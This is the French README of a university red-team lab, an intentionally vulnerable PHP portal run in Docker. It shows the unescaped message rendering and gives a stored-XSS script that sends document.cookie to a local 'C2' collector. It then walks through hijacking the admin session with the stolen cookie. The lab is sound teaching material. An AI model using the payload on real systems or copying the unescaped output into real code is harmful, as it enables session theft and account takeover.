# P01 — XSS Stocké · Plateforme Universitaire UniPortail

**EMINES UM6P · Benguerir · 2026 — Red Team**

> ⚠️ Application volontairement vulnérable — usage pédagogique uniquement.
> Voir [DISCLAIMER.md](DISCLAIMER.md).

---

## 🏗️ Architecture

```
p01-xss-universite/
├── app/                  ← Application cible (PHP 8.2 + Apache)
│   ├── index.php         ← Page de connexion
│   ├── dashboard.php     ← Tableau de bord (rôle-dépendant)
│   ├── notes.php         ← Relevé de notes
│   ├── emploi_du_temps.php
│   ├── messagerie.php    ← ⚠️  VULNÉRABLE — XSS stocké ici
│   ├── admin.php         ← Panneau admin
│   ├── config.php        ← Connexion BDD
│   └── layout.php        ← Template HTML commun
├── db/
│   └── init.sql          ← Schéma + données de test
├── attacker/
│   └── collector.php     ← Interface C2 + collecteur de cookies
├── docker-compose.yml
└── DISCLAIMER.md
```

## 👥 Hiérarchie des rôles

| Rôle | Accès |
|------|-------|
| **Administrateur** | Tableau de bord global, gestion des utilisateurs, toutes les notes, messagerie |
| **Professeur** | Notes de tous les étudiants, emploi du temps, messagerie |
| **Étudiant** | Ses propres notes, emploi du temps, messagerie |

---

## 🚀 Lancement 

### Prérequis

- Docker Desktop installé et démarré
- Ports libres : `8080` (app), `8888` (attaquant), `3306` (MySQL)

### Commandes

```bash
# 1. Cloner / décompresser le projet
cd p01-xss-universite

# 2. Construire et lancer tous les conteneurs
docker compose up --build -d

# 3. Attendre ~15 secondes que MySQL démarre, puis ouvrir :
#    Application :  http://localhost:8080
#    Attaquant C2 : http://localhost:8888
```

### Arrêt

```bash
docker compose down          # Arrêter
docker compose down -v       # Arrêter + supprimer les données
```

---

## 🔑 Comptes de test

| Rôle | Email | Mot de passe |
|------|-------|-------------|
| Administrateur | admin@uni.ma | Admin@2026 |
| Professeur 1 | ybenali@uni.ma | Prof@2026 |
| Professeur 2 | souali@uni.ma | Prof@2026 |
| Étudiant 1 | kalami@uni.ma | Etud@2026 |
| Étudiant 2 | fchraibi@uni.ma | Etud@2026 |
| Étudiant 3 | oidrissi@uni.ma | Etud@2026 |

---

## 🎯 Démonstration de l'attaque XSS Stocké

### Où se trouve la vulnérabilité ?

Dans `app/messagerie.php`, le corps du message est affiché **sans échappement** :

```php
// ⚠️ VULNÉRABLE — ligne ~111 de messagerie.php
<div class="message-body">
  <?= $currentMsg['corps'] ?>   ← pas de htmlspecialchars() !
</div>
```

Le contenu est aussi stocké sans filtre :

```php
$stmt->execute([$uid, $dest_id, htmlspecialchars($sujet), $corps]);
//                                                          ^^^^^ pas de sanitisation
```

### Scénario de démonstration

**Étape 1 — Préparation (Attaquant)**

1. Ouvrir le C2 attaquant : `http://localhost:8888`
2. Se connecter sur l'app en tant qu'**étudiant** : `kalami@uni.ma / Etud@2026`

**Étape 2 — Injection du payload**

3. Aller dans **Messagerie → Nouveau message**
4. Destinataire : `Admin Système`
5. Sujet : `Question importante`
6. Corps du message — coller ce payload :

```html
Bonjour,

J'ai une question concernant mes notes du semestre 1.

<script>
var img = new Image();
img.src = "http://localhost:8888/collect?c=" + encodeURIComponent(document.cookie);
</script>

Cordialement,
Karim Alami
```

7. Cliquer **Envoyer**

**Étape 3 — Déclenchement (Victime)**

8. Ouvrir un **nouvel onglet en navigation privée**
9. Se connecter en tant qu'**admin** : `admin@uni.ma / Admin@2026`
10. Aller dans **Messagerie**
11. Ouvrir le message de Karim Alami

→ Le script s'exécute dans le navigateur de l'admin.

**Étape 4 — Vérification**

12. Revenir sur `http://localhost:8888`
13. Le cookie de session admin apparaît dans "Cookies collectés"

**Étape 5 — Usurpation de session**

14. Dans le navigateur de l'attaquant, ouvrir `http://localhost:8080`
15. DevTools (F12) → Application → Cookies → `http://localhost:8080`
16. Modifier `PHPSESSID` avec la valeur volée
17. Rafraîchir → l'attaquant est maintenant connecté en tant qu'**admin** 🔓

---

## 🔬 Analyse technique

### Pourquoi ça fonctionne ?

1. **Stockage non filtré** : le payload JavaScript est enregistré tel quel en BDD
2. **Affichage non échappé** : `echo $row['corps']` injecte directement le HTML
3. **Cookie accessible** : pas de flag `HttpOnly` sur la session PHP

### Correctif (non appliqué — intentionnellement)

```php
// ✅ VERSION SÉCURISÉE (à NE PAS implémenter dans P01)
echo htmlspecialchars($currentMsg['corps'], ENT_QUOTES, 'UTF-8');
// + php.ini : session.cookie_httponly = 1
// + CSP header : Content-Security-Policy: script-src 'self'
```

---

## 📦 Livrables

- [x] Code source versionné
- [x] README d'installation (< 5 min)
- [x] `docker-compose.yml` avec 3 services
- [x] Base de données initialisée avec données fictives
- [x] Serveur collecteur de cookies (C2)
- [x] `DISCLAIMER.md`
- [ ] Rapport PDF (à rédiger séparément)
- [ ] Présentation (à préparer séparément)

---

*Projet P01 · Red Team · XSS Stocké · EMINES UM6P · 2026*
